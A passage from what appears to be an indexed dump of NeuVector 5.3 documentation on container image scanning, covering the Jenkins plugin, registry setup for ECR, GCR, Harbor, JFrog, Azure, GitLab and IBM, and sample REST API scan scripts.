$NV_SCANNING_JSON | jq . - echo &quot;Logout&quot; - curl $NV_API_AUTH_URL -k -X 'DELETE' -H &quot;Content-Type:application/json&quot; -H &quot;X-Auth-Token:$TOKEN&quot; after_script: - docker stop neuvector.controller - docker rm neuvector.controller  ","version":"5.3","tagName":"h3"},{"title":"Jenkins Details","type":0,"sectionRef":"#","url":"/scanning/build/jenkins","content":"","keywords":"","version":"5.3"},{"title":"Detailed Configuration for the Jenkins Plugin​","type":1,"pageTitle":"Jenkins Details","url":"/scanning/build/jenkins#detailed-configuration-for-the-jenkins-plugin","content":" Containers provide an easy and efficient way to deploy applications. But container images may contain open source code over which you don't have a full control. Many vulnerabilities in open source projects have been reported, and you may decide to use these libraries with vulnerabilities or not after scanning the images and reviewing the vulnerability information for them.  The NeuVector Vulnerability Scanner Jenkins plugin can scan the images after your image is built in Jenkins. The plug-in source and latest documentation can be found here on the NeuVector GitHub page.  The plug-in supports two scan modes. The first is &quot;Controller &amp; Scanner&quot; mode. The second is the standalone scanner mode. You can select the scan mode in the project configuration page. By default, it uses the &quot;Controller &amp; Scanner&quot; mode.  For the &quot;Controller &amp; Scanner&quot; mode, you need to deploy the NeuVector controller and scanner in the network. To scan the local image (the image on the Jenkins machine), the &quot;Controller &amp; Scanner&quot; needs to be installed on the same node where the image exists.  For the standalone scanner mode, the Docker run-time must be installed on the same host with Jenkins. Also, add the jenkins user to the docker group.  sudo usermod -aG docker jenkins   Jenkins Plugin Installation​  First, go to Jenkins in your browser to search for the NeuVector plug-in. This can be found in:  -&gt; Manage Jenkins -&gt; Manage Plugins -&gt; Available -&gt; filter -&gt; search NeuVector Vulnerability Scanner -&gt;  Select it and click `install without restart.'  Deploy the NeuVector Controller and Scanner container if you haven't already done so on a host reachable by the Jenkins server. This can be on the same server as Jenkins if desired. Make a note of the IP address of the host where the Controller is running. Note: The default REST API port is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.  In addition, make sure there is a NeuVector scanner container deployed standalone and configured to connect to the Controller (if Controller is being used).  There are two scenarios for image scanning, local and registry scanning.  Local Image Scan. If you use the plugin to scan local images (before pushing to any registries), you can scan on the same host as the controller/scanner or configure the scanner to access the docker engine on a remote host.Registry Image Scan. If you use the plugin to scan registry images (after pushing to any registries, but as part of the Jenkins build process), the NeuVector Scanner can be installed on any node in the network with connectivity between the registry, NeuVector Scanner, and Jenkins.  Global Configuration in Jenkins​  After installing the plugin, find the ‘NeuVector Vulnerability Scanner’ section in the global configuration page (Jenkins ‘Configure System’). Enter values for the NeuVector Controller IP, port, username, and password. You may click the ‘Test Connection’ button to validate the values. It will show ‘Connection Success’ or an error message.  The timeout minutes value will terminate the build step within the time entered. The default value of 0 means no timeout will occur.  Click the ‘Add Registry’ to enter values for the registry you will use in your project. If you will be only scanning local images, you don’t need to add a registry here.  Scenario 1: global configuration example for local image scan    Scenario 2: global configuration example for registry image scan  For global registry configuration, follow the instructions above for local, then add the registry details as below.    Standalone Scanner​  Running Jenkins scan in standalone mode is a lightweight way to scan image vulnerabilities in the pipeline. Scanner is dynamically invoked and no installaton of controller setup is required. This is especially useful when scaning an image before it is pushed to a registry. It also has no limit on how many scan tasks can run at the same time.  In order to run vulnerability scan in standalone mode, the Jenkins plugin need pull the scanner image to the host where the agent is running, so you need enter NeuVector Scanner registry URL, image repository, and the credential if needed, in NeuVector plugin configuration page.  The scan result can also be submitted to the controler and used in the admission control function. In this case, you do need a controller setup and specify how to connect to the controller in NeuVector plugin configuration page.  Local Configuration for scanning a remote Docker Host​  Prerequisites for Local Scan on a Remote Docker HostTo enable NeuVector to scan an image that is not on the same host as the controller/allinone:  Make sure the docker run-time api socket is exposed via TCPAdd the following environment variable to the controller/allinone: SCANNER_DOCKER_URL=tcp://192.168.1.10:2376  Project Configuration​  In your project, choose the 'NeuVector Vulnerability Scanner' plugin from the drop down menu in the 'Add build step.' Check the box &quot;Scan with Standalone scanner&quot; if you want to do the scan in the standalone scanner mode. By default, it uses &quot;Controller &amp; Scanner&quot; mode to do the scan.  Choose Local or a registry name which is the nickname you entered in global config. Enter the repository and image tag name to be scanned. You may choose Jenkins default environment variables for the repository or tag, e.g. $JOB_NAME, $BUILD_TAG, $BUILD_NUMBER. Enter the values for the number of high or medium, and for any name of the vulnerabilities present to fail the build.  After the build is finished, a NeuVector report will be generated. It will show the scan details and errors if any.  Scenario 1: local configuration example    Scenario 2: registry configuration example    Jenkins Pipeline​  For the Jenkins pipeline project, you may write your own pipeline script directly, or click the ‘pipeline syntax’ to generate the script if you are new to the pipeline style task.    Select the NeuVector Vulnerability Scanner from the drop-down, configure it, and Generate the script.    Copy the script into your Jenkins task script.  Scenario 1: Simple local pipeline script example (to insert into your pipeline script):  ... stage('Scan local image') \\{ neuvector registrySelection: 'Local', repository: 'your_username/your_image' \\} ...   Scenario 2: Simple registry pipeline script example (to insert into your pipeline script):  ... stage('Scan local image') \\{ neuvector registrySelection: 'your_registry', repository: 'your_username/your_image' \\} ...   Additional Stages​  Add your own pre- and post- image scan stages, for example in the Pipeline stage view example below.    You are now ready to start your Jenkins builds and trigger the NeuVector Vulnerability Scanner to report any vulnerabilities!  ","version":"5.3","tagName":"h3"},{"title":"OpenShift Route and Registry Token Example​","type":1,"pageTitle":"Jenkins Details","url":"/scanning/build/jenkins#openshift-route-and-registry-token-example","content":" To configure the plug-in using an OpenShift route for ingress to the controller, add the route into the controller IP field.    To use token based authentication to the OpenShift registry, use NONAME as the user and enter the token in the password.  ","version":"5.3","tagName":"h3"},{"title":"Special Use Case for Jenkins in the Same Kubernetes Cluster​","type":1,"pageTitle":"Jenkins Details","url":"/scanning/build/jenkins#special-use-case-for-jenkins-in-the-same-kubernetes-cluster","content":" To do build-phase scanning where the Jenkins software is running in the same Kubernetes cluster as the scanner, make sure the scanner and Jenkins are set to run on the same node. The node needs to be labeled so the Jenkins and scanner containers run on the same node because the scanner needs access to the local node's docker.sock to access the image. ","version":"5.3","tagName":"h3"},{"title":"ECR Scanning using IAM Roles","type":0,"sectionRef":"#","url":"/scanning/registry/ecr-iam","content":"","keywords":"","version":"5.3"},{"title":"AWS ECR - IAM Roles​","type":1,"pageTitle":"ECR Scanning using IAM Roles","url":"/scanning/registry/ecr-iam#aws-ecr---iam-roles","content":" When the NeuVector containers are deployed in AWS, and an EC2 instance is assigned a role of “EC2 Container Registry” Read Access, the AWS ECR registry can be scanned without an Access Key and Secret Key.  Here is how to create an AWS role and assign it to the node.  Select the Instance​  Note that the IAM role is either blank or does not include the ECR role    Attach a Role​  Select Actions -&gt; Instance Settings -&gt; Attach/Replace IAM Role    If you have not previously created the ECR role, click Create New IAM Role. Enter the role name.    Select the AWS Service​    List of Roles​    Attach the ECR Read Permission to the Role​    Review Your Settings​    Check the Instance for IAM Role​   ","version":"5.3","tagName":"h3"},{"title":"GCR Scanning using Service Accounts","type":0,"sectionRef":"#","url":"/scanning/registry/gcr-sa","content":"","keywords":"","version":"5.3"},{"title":"Google GCR - Authentication/Scanning with GCP Service Accounts​","type":1,"pageTitle":"GCR Scanning using Service Accounts","url":"/scanning/registry/gcr-sa#google-gcr---authenticationscanning-with-gcp-service-accounts","content":" It is a best practice to not depend on user attributed accounts for integrations. GCP supports using a service account to access GCR. Here are the steps to enable a service account for GCR and use it to trigger repository scans from NeuVector.  Start in NeuVector, where one first sets up a new registry:    By selecting Google Container Registry as the repo type, this panel is customized to accept the input required to use your GCR.  Name - Here’s where you give this particular repo entry a name of your choosing. It’s merely to identify it in the NeuVector interface later on.Registry - This is the first place where you’ll want to be sure the correct data is collected from your GCR instance. While the example of https://gcr.io is the most common, we will want to be sure it accurately reflects how your GCR was set up in GCP. It might be https://us.gcr.io for example. We’ll go check it in the next section.JSON Key - As is pretty self-evident, this will be a JSON-formatted key. And, as you’re probably seeing a pattern set up for, we’ll be finding that via GCP.Filter - Be mindful that you will likely need to replace any filters here with the actual name of the repo. Again, that’s in the GCR interface.   Now let’s head on over to that GCR screen in GCP. Much of what we need is right here on this page.  A. See the “gcr.io” under Hostname? That’s what belongs in item #2, Registry in the NeuVector interface. (Don’t forget the https:// part) B. The ID of the repo is actually under the top level project. This is what you will be using in #3, Filter. See example of env-demo below.    The JSON Key leads us to explore another very important step, and that takes us to the IAM &amp; Admin section of GCP where we will create (or confirm the setting of) a Service Account. See below:    Once you enter the data for the first step of creating a service account, you need to press the “CREATE” button to get step 2 to be willing to accept input.    Be sure to select Basic —&gt; Viewer for the access. If you have an existing service account, ensure that the access is set this way. (Hint: Even access permissions that appear to be more powerful don’t seem to allow for proper access. Don't skip this step.  Once you’ve done this step, you can breeze past Step 3 and proceed with creating the Service Account.  If you don’t immediately land on the info panel for your new service account, be sure to go there on the Service Accounts list. See figure 5 below.    Click “ADD KEY” —&gt; “Create New Key”    As you have already concluded, JSON is the go-to here. Selecting “CREATE” will result in a file that you can download in your browser. The contents of this file should be pasted into the 3, JSON Key field in NeuVector; see figure 1.  Before you get too excited there’s one more thing to ensure. In order for the scanner in NeuVector to use the API to scan and protect your images, said API must be enabled in your GCP account. You can either enable it via the command line via  gcloud services enable artifactregistry.googleapis.com   Or you can use the GCP gui. Head to “API Library” and search for “Artifact Registry API” and ensure it is turned on for your project. See figure 7.    You should be set! See figure 8 below for a properly-configured registry using the data from our example:    Obtain the Access Token Using the REST API​  The NeuVector REST API may be used to authenticate using the service account. The below example uses gcloud to obtain the access token. The username is “oauth2accesstoken”.  gcloud auth print-access-token ya29.a0AfH6SMAvyZ2zkD3MZD_K8Lqr7qkIsRkGNqhAGthJ_A7lp8OGRe7xh5KmuQY-VJfqu83C9e1gi7A_m1InNm8QIoTGf9WHXnOeAr1gT_O6b6K667NUz1_YDunjdW09jt0XvcBGQaxjJ3c4aHlxdehBFiE_9PMk13JDt_T6f0_6vzS7   Use the Token with NeuVector Repository Scanning​  The below example script incorporates the access token to trigger GCR repository scan.  _curCase_=`echo $0 | awk -F&quot;.&quot; '{print $(NF-1)}' | awk -F&quot;/&quot; '{print $NF}'` _DESC_=&quot;able to scan ubuntu:16.04 image&quot; _ERRCODE_=0 _ERRTYPE_=1 _RESULT_=&quot;pass&quot; # please remember to specify the controller ip address here _controllerIP_=&quot;10.1.24.252&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot; _registryURL_=&quot;https://us.gcr.io/&quot; # registry urls could also be gcr.io, eu.gcr.io, asia.gcr.io etc _registryUsername_=&quot;oauth2accesstoken&quot; _registryPassword_=$(gcloud auth print-access-token) _repository_=&quot;bionic-union-271100/alpine&quot; _tag_=&quot;latest&quot; curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` scanning an image ... curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json while [ `wc -c &lt; scan_repository.json` = &quot;0&quot; ]; do echo `date +%Y%m%d_%H%M%S` scanning is still in progress ... sleep 5 curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json done echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 cat scan_repository.json | jq . rm *.json echo `date +%Y%m%d_%H%M%S` [$_curCase_] $_DESC_: $_RESULT_-$_ERRCODE_  ","version":"5.3","tagName":"h3"},{"title":"Harbor Pluggable Scanner Module","type":0,"sectionRef":"#","url":"/scanning/registry/harbor","content":"","keywords":"","version":"5.3"},{"title":"Scanning Harbor Registries Using the Pluggable Scanner​","type":1,"pageTitle":"Harbor Pluggable Scanner Module","url":"/scanning/registry/harbor#scanning-harbor-registries-using-the-pluggable-scanner","content":" NeuVector supports invoking the NeuVector scanner from Harbor registries through the pluggable scanner interface. This requires configuration of the connection to the controller (exposed API). The Harbor adapter calls controller endpoint to trigger a scan, which can scan automatically on push. Interrogation services can be used for periodic scans. Scan results from Federation Primary controllers ARE propagated to remote clusters.  note There is an issue with the HTTPS based adapter endpoint error: please ignore Test Connection error, it does work even though an error is shown (skip certificate validation).  Deploying the NeuVector Registry Adapter​  The 5.2 Helm chart contains options to deploy the registry adapter for Harbor. It can also be pulled manually from the neuvector/registry-adapter repo on Docker Hub. Options also include setting the Harbor registry request protocol and the basic authentication secret name.  After deployment of the adapter, it is necessary to configure this in Harbor.    The adapter endpoint must be entered, and the adapter connects to the controller, which is typically exposed as a service externally so the adapter can connect to it. In addition, authentication credentials for a valid NeuVector user must be entered.  Scanning Images from a Harbor Registry​  After successful deployment and connection to a controller, an image scan can be manually or automatically triggered from Harbor.    Periodic scans (scheduled) can be configured through Interrogation Services in Harbor, to make sure the latest CVE database is used to rescan images in registries.    Scan results can be viewed directly in Harbor.    Sample Deployment Yaml​  Samples for Kubernetes and OpenShift ","version":"5.3","tagName":"h3"},{"title":"Registry Scanning Configuration","type":0,"sectionRef":"#","url":"/scanning/registry","content":"","keywords":"","version":"5.3"},{"title":"Configure Registry Scanning​","type":1,"pageTitle":"Registry Scanning Configuration","url":"/scanning/registry#configure-registry-scanning","content":" To configure registries and repositories to be scanning, go to the Assets -&gt; Registries menu in the NeuVector console. Add or edit registries to be scanned. Use the Filter to define repositories or subsets of images to be scanned. If your registry requires access through a proxy, this can be configured in Settings -&gt; Configuration.    The registry will be scanned according to a schedule, which is configurable. By default, only new or updated images will be scanned. If you want to re-scan all applicable images whenever the CVE database is updated, select the Rescan After CVE DB Update button when configuring the registry. You can also select Layered Scan to show vulnerabilities by each layer in the image (note: layered scans can take longer and consume more resources to complete).  After the scan is completed you will see the results below it. Click on the repository/tag to see vulnerabilities and click on the vulnerability to see more info. You can also download the report in a CSV file or see the results in the Event logs.    The scan results include vulnerabilities by image layer, if this option was selected during registry/repository configuration, as well the compliance checks results. Click the compliance tab when viewing the scan results for the image to see compliance checks.  Scanning will also discover and list all Modules (ie, an inventory) in the image, as shown below. It will also summarize the vulnerability risk by module and list all vulnerabilities for each module.    Scanning is supported for images on public and private docker registries that are based on Native Docker, Amazon ECR, Redhat/Openshift, jFrog, Microsoft ACR, Sonatype Nexus, Harbor, Google cloud and other registries. The scan report for the image comprises of the vulnerability status of various packages and binaries in the image. The brief summary of the scan report can be sent via webhook using the Response rule configuration in Policy -&gt; Response Rules, or by Syslog by configuring a syslog server in Settings -&gt; Configuration. Results can also be viewed in the Event logs.  At least one repository filter is required (can't be left blank).  Repository filter examples​    Notes:  To scan all image tags, add filter as * or *:*. This works on all registry types except the public docker registry.Repository should be full name if organization is nil for public docker registry or add library before repository as given above.Create a virtual repository and add all local repository to it to scan all tags on a JFrog registry with the subdomain docker access method.Regular expressions can be used in a filter. For example alpine:3.[8|9].* will scan all 3.8.x and 3.9.x images and tags on docker hub.  Registry scan options​  Scan Layers: Provides vulnerability scan result for every image layer separatelyProvides information about commands executed, packages added in the layerImages size of each layer Auto Scan: Auto Scan is only supported with OpenShift imagestream integration. Proper role binding should be configured in advance.When Auto Scan is enabled, as soon as an image is pushed to the registry, the image scan will be scheduled. Periodical Scan: Enable periodic scan to scan periodicallyScan interval can set to be between 5 minutes to every 7 days.Because many Admission Control checks rely on image scan result, enabling periodical scan helps make sure Admission Control has the up-to-date information of the images.Note that NeuVector will scan images in a regsistry that are new/changed from the previous scan. Rescan after CVE DB update Enable this option to rescan all images after the vulnerability database is updated.  Configuring Proxy server for Registry​  Please go to Settings -&gt; Configuration to configure proxy settings for registry scanning.  Native Docker registry (also Quay and Harbor)​  Add Native Docker registry​  Choose Docker registry as typeGive unique name to the registryType registry URL with portProvide username and password if required by the registryAdd repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2*  Adding private docker registry with username/password, scan layers enabled, periodic scan for every 30 minutes enabled and * as filter to scan all tags from all repository.  Adding public docker registry for scanning without username/password and 2 repositories with wildcard, scan layers enabled and periodic scan enabled.  Adding public docker registry for scanning with username/password, wildcard repository, scan layers enabled, and periodic scan enabled.  Note for Quay:  Enter the top-level URL for your Quay registry; do not enter any directories to the path.You will need to generate an encrypted password in your Quay server/account, and use these credentials here. Then, pass filter(s) as described above.    Start scanning the Docker registry​  Select registry to be scannedClick start button to scanWait till status changes from scanning to idle Scanning time varies depending on the size of the repository    View the scan result​  Click on an image from images pane to view the scan result for the image.Access the scan result to find the vulnerability status of the image.Click download button to download scan result of the image if neededMove mouse in between CVE detail and images to get back to summary  Showing images scanned for the selected registry    Example showing layer scan result of an image, which shows vulnerabilities of each layer, layer size and commands run on each layer. In addition, there is a Compliance tab which shows the compliance test results for the image.    Amazon ECR Registry​  Ref: https://docs.aws.amazon.com/AmazonECR/latest/userguide/Registries.html  Add Amazon ECR registry​  Choose Amazon registry as typeGive unique name to the registryRegistry URL is automatically found with other informationSupply below information for the registry. Refer above amazon link to get below information Registry idRegionAccess key idSecret access key Add repository as filter in the following format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2*Organization can be empty if such image available in the registry* to scan all image tags    Redhat registry​  Ref: https://access.redhat.com/containers  Add Red Hat registry​  Choose Redhat registry as typeGive unique name to the registryType registry URL https://registry.connect.redhat.com/Provide username and password of the account used for managing registryAdd repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2** to scan all image tags    Openshift registry​  Add OpenShift registry with username and password​  Choose OpenShift registry as typeGive unique name to the registryType registry URL (obtain from the output of &quot;oc get is&quot; command in OpenShift network if it is different than default) Default registry URL https://docker-registry.default.svc:5000/ Provide username and password of the account used for managing registryAdd repository as filter in the below format Organization/repository:tagExample openshift/htt*:** to scan all image tags Enable auto scan to start the scan as soon as image is updated on OpenShift image stream.  Add OpenShift registry with token​  Choose OpenShift registry as typeGive unique name to the registryType registry URL (obtain from the output of &quot;oc get is&quot; command in OpenShift network if it is different than default) Default registry URL https://docker-registry.default.svc:5000/ Provide token of the service account which has access to all namespaces Check below note to create service account and get token.Create service account oc project defaultoc create sa nvqaoc get sa Assign cluster admin role to service account to read all registry oc adm policy add-cluster-role-to-user cluster-admin system:serviceaccount:default:nvqa Get token for the service account oc sa get-token nvqa Add repository as filter in the below format Organization/repository:tagExample openshift/htt*:** to scan all image tags Enable auto scan to start the scan as soon image is updated on OpenShift image stream.    Stability issues in Openshift 3.7 Registry​  In OpenShift 3.7, API calls to pull container image metadata or to download an image can fail randomly. It can also fail on random images in different scan runs. You may see incomplete image lists or scans may fail on some images when this happens. If this occurs, the repository can be rescanned.  JFrog Artifactory​  Adding JFrog Artifactory registry (Docker Access method – Repository Path) JFrog management page admin-&gt;HTTP Setting showing docker access method - Repository Path    Add JFrog Artifactory registry (Docker Access method – Repository Path)​  Choose JFrog Artifactory as typeGive a unique name to the registry Type the registry URL with port, for example http://10.1.7.122:8081/ Provide a username and password if required by the registryAdd the repository as a filter in the below format Organization/repository:tagRepository or tag can have wildcards at end, such as abc/*, abc/n*To scan all tags for a repository, for example alpine, use alpine:*The wildcard must be preceded by the full name, path, or starting string* to scan all tags  Adding JFrog Artifactory registry (Docker Access method – subdomain)​  JFrog management page admin-&gt;HTTP Setting showing docker access method – Sub Domain    Add JFrog Artifactory registry (Docker Access method – subdomain)  Choose JFrog Artifactory as typeGive a unique name to the registryType the registry URL with port, for example http://10.1.7.122:8081/Choose Subdomain as JFrog Docker Access MethodProvide a username and password if required by the registryAdd the repository as a filter in the below format Subdomain/repository:tagRepository or tag can have wildcards at end, such as abc/*, abc/n*To scan all tags for a repository, for example alpine, use alpine:*The wildcard must be preceded by the full name, path, or starting string* for scanning all tags from all subdomains  note Create a virtual repository and add all local and remote repository to it. Specify this virtual repository in the filter section to scan all tags from local and remote remote repository.  Adding subdomain based JFrog registry to scan images from docker-local subdomain    Adding subdomain based JFrog registry to scan all tags from all subdomains    Add JFrog Artifactory registry (Docker Access method – port)​  JFrog management page admin-&gt;HTTP Setting showing docker access method - Port    JFrog management page admin-&gt;Local Repository-&gt;docker-local repository-&gt; Advanced - showing repository URL and registry port 8181    JFrog management page admin-&gt;Local Repository-&gt;guo repository-&gt; Advanced - showing repository URL and registry port 8182    Choose JFrog Artifactory as typeGive a unique name to the registryType the registry URL with port, for example http://10.1.7.122:8181/ Every Registry name has unique port Choose Port as JFrog Docker Access MethodProvide a username and password if required by the registryAdd the repository as a filter in the below format Organization/repository:tagRepository or tag can have wildcards at end, such as abc/, abc/nTo scan all tags for a repository, for example alpine, use alpine:*The wildcard must be preceded by the full name, path, or starting string* for scanning all tags  Adding JFrog registry for port access method for registry docker-local with port 8181    Adding JFrog registry for port access method for registry with port 8182    Adding JFrog registry for port access method for the virtual registry with port 8188, which has all local registries added to it.    Showing scanned result for docker-local registry    Add SaaS JFrog Artifactory registry (Docker access method – Port)​  Choose JFrog Artifactory as type  Give a unique name to the registryType the registry URL, for example https://jfrogtraining-docker-nv-virtual.jfrog.ioChoose Port as JFrog Docker Access MethodProvide a username and password if required by the registryAdd the repository as a filter in the below format Organization/repository:tag* to scan all tags of all repository    Start Scanning a JFrog Artifactory Registry​  Select registry to be scannedClick start button to scanWait until status changes from scanning to idle Scanning time varies depending on the size of the repository  Google Container Registry​  Ref:https://cloud.google.com/container-registry/docs/advanced-authenticationhttps://cloud.google.com/container-registry/docs/advanced-authentication#json_key_file  Enable Cloud Resource Manager API for the project​  Google Cloud Platform-&gt;Choose Project-&gt;API and Services-&gt;Enable APIS and Services-&gt;Search “Cloud Resource Manager API”-&gt;Enable APIhttps://console.cloud.google.com/apis/library?project=nvtest-219600&amp;q=Cloud%20Resource%20Manager%20API (change project name)  Create key for container service account​  Google Cloud Platform--&gt;IAM--&gt;Service Account--&gt;account with container registry--&gt;CreateKey(action)--&gt;  Copy json file to client machine​  Add Google Container Registry from the NeuVector GUI​  Choose Google registry as typeGive unique name to the registryType registry URL. Sample https://gcr.io/ (this could also be us.gcr.io, eu.gcr.io etc)Paste all content above captured json file into JSON key.Add repository as filter in the below format Project-id/repository:tagExample nvtestid-1/neuvector*:** to scan all image tags  Start Scanning a Google Container Registry​  Select registry to be scannedClick start button to scanWait until status changes from scanning to idle Scanning time varies depending on the size of the repository  Azure Container Registry​  Ref:https://azure.microsoft.com/en-us/services/container-registry/  Obtain Azure container username and password as shown below​  Azure container registry -&gt; user-&gt; access keys-&gt;password  Showing azure portal username and password for container registry access    Add Azure Container Registry from the NeuVector GUI​  Choose Azure registry as typeGive unique name to the registryType registry URL. Sample https://neuvector.azure.io (obtain from azure portal) Container registry-&gt;user-&gt;Overview-&gt;Login Server Add username and password Azure container registry -&gt; user-&gt; access keys-&gt;password Add repository as filter in the below format repository:tagexample alpine:** to scan all image tags  Showing azure portal login server for Azure container registry    Adding Azure container registry to scan all tags    Start Scanning a Azure Container Registry​  Select registry to be scannedClick start button to scanWait until status changes from scanning to idle Scanning time varies depending on the size of the repository  Sonatype Nexus Docker registry​  Ref:https://help.sonatype.com/repomanager3/private-registry-for-dockerhttps://hub.docker.com/r/sonatype/nexus3/  Add Sonatype Nexus Docker registry​  Choose Sonatype Nexus as typeGive unique name to the registryType registry URL with portProvide username and password if required by the registryAdd repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2** to scan all image tags  Adding Sonatype Nexus docker registry with username/password and repository *:* for scanning    Start scanning Sonatype Nexus Docker registry​  Select registry to be scannedClick start button to scanWait till status changes from scanning to idle Scanning time varies depending on the size of the repository  Gitlab Container Registry​  Sample GitLab Environmnent Configurations​  sudo docker run --detach \\ --hostname gitlab \\ --env GITLAB_OMNIBUS_CONFIG=&quot;external_url 'http://10.1.7.73:9096'; gitlab_rails['lfs_enabled'] = true;&quot; \\ --publish 10.1.7.73:9095:9095 --publish 10.1.7.73:9096:9096 --publish 10.1.7.73:6222:22 \\ --name gitlab \\ --restart always \\ --volume /srv/gitlab/config:/etc/gitlab \\ --volume /srv/gitlab/logs:/var/log/gitlab \\ --volume /srv/gitlab/data:/var/opt/gitlab \\ gitlab/gitlab-ce:latest External_URL: http://10.1.7.73:9096 Registry_URL: https://10.1.7.73:9095   Obtain Gitlab private token as shown below​  Navigate to the settings page from the icon located at the upper-righthand corner of the GitLab login page as illustrated below:    Navigate to the Access_Tokens page as shown below from the User_Settings page:    Fill in all applicable fields, and click “Create personal access token” when ready to generate the access token:    Access token will no longer be available once the user has navigated away from the generated token page. Therefore, it is highly recommended to make a copy of the access token prior to navigating or closing the following page:    Obtaining External and Registry URLs​  External-URL: The external url is the API-Server's URL. Registry-URL: This can be obtained from the Container Registry page of the GitLab webconsole. One way to get to this page is navigating from the GitLab’s webconsole from Projects &gt; Your Projects &gt; Administrator / … &gt; Left-Pane (Container Registry) &gt; Mouse-over (root/.../)  The following is a sample screen-capture of the page that reveals both the External-URL and the Registry-URL:    Add Gitlab Registry from the NeuVector Console​  Choose Gitlab as the registry typeGive unique name to the registryType registry URL with portProvide username and password if required by the registryProvide Gitlab external URL and the private token obtained from the last section    note The Registry URL is used for pulling images into the NeuVector scanner-platform from GitLab to do registry scanning. While the External URL is used for retrieving a list of images, registries, and metadata used by the registry scanning feature.  IBM Cloud Container Registry​  Ref: https://www.ibm.com/cloud/container-registry  Add IBM Container registry​  Choose IBM Cloud Container Registry as typeGive unique name to the registryType registry URL https://us.icr.io/Provide iamapikey as username and the apikey below as password Create apikey from CLI ibmcloud iam api-key-create atibmKey Create apikey from GUI IBM Cloud-&gt;Manage-Access(IAM)-IBM Cloud API Keys Provide IBM Cloud Account Obtain IBM cloud account from CLI Ibmcloud cr info Add repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2* to scan all image tags Enable other parameters if needed    note The username for the registry authentication must be 'iamapikey'  Harbor Registry​  Use the same instructions as for the Native Docker registry, choosing Docker as the registry.  The filter field can not be left blank. Enter a repository filter, or add filter as * to scan all repositories. ","version":"5.3","tagName":"h3"},{"title":"Scanning & Compliance","type":0,"sectionRef":"#","url":"/scanning/scanning","content":"","keywords":"","version":"5.3"},{"title":"Overview of NeuVector Scanning​","type":1,"pageTitle":"Scanning & Compliance","url":"/scanning/scanning#overview-of-neuvector-scanning","content":" Scanning is performed at all phases of the pipeline from Build to Registry to Run-Time, on various assets, as shown below.  Scan Type\tImage\tNode\tContainer\tOrchestratorVulnerabilities\tYes\tYes\tYes\tYes CIS Benchmarks\tYes\tYes\tYes\tYes Custom Compliance\tNo\tYes\tYes\tNo Secrets\tYes\tYes\tYes\tNo Modules\tYes\tN/A\tN/A\tN/A  Images are scanned either in Registry scanning or through Build-phase plug-ins such as Jenkins, CircleCI, Gitlab etc.  The CIS Benchmarks support by NeuVector include:  KubernetesDockerRed Hat OpenShift draft 'Inspired by CIS' benchmarksGoogle GKE  The open source implementation of these benchmarks can be found on the NeuVector Github page.  note Secrets can also be detected on Nodes and in Containers with Custom Scripts.  Kubernetes Resource Deployment File Scanning​  NeuVector is able to scan deployment yaml files for configuration assessments against Admission Control rules. This is useful to scan deployment yaml files early in the pipeline to determine if the deployment would violate any rules before attempting the deployment. Please see Configuration Assessment under Admission Controls for more details.  ","version":"5.3","tagName":"h3"},{"title":"Managing Vulnerabilities and Compliance​","type":1,"pageTitle":"Scanning & Compliance","url":"/scanning/scanning#managing-vulnerabilities-and-compliance","content":" NeuVector provides several ways to review vulnerability and compliance scan results and generate reports. These include:  Dashboard. Review summary vulnerabilities and see how they impact the overall Security Risk Score.Security Risks Menu. View the impact of vulnerabilities and compliance issues and generate reports with advanced filtering.Assets Menu. See vulnerability and compliance results for each asset such as registries, nodes, and containers.Notifications -&gt; Risk Reports. View scan events for each asset.Response Rules. Create responses such as web hook notifications or quarantines based on scan results.REST API. Trigger scans and pull scan results programmatically to automate the process.SYSLOG/Webhook Alerts. Send scan results to a SIEM or other enterprise platforms.  Security Risks Menu​  These menu's combine the results from registry (image), node, and container vulnerability scans and compliance checks found in the Assets menu to enable end-to-end vulnerability management and reporting. The Compliance profile menu enables customization of the PCI, GDPR and other compliance checks for generating compliance reports.    See the next section on Vulnerability Management for how to manage vulnerabilities in this menu, and the Compliance &amp; CIS Benchmarks section for reporting on CIS Benchmarks and industry compliance such as PCI, GDPR, HIPAA, and NIST.  Assets Menu​  The Assets menu reports vulnerabilities and compliance checks results organized by the asset.  Platforms. The orchestration platform such as Kubernetes, and vulnerability scans of the platform.Nodes. Nodes/hosts 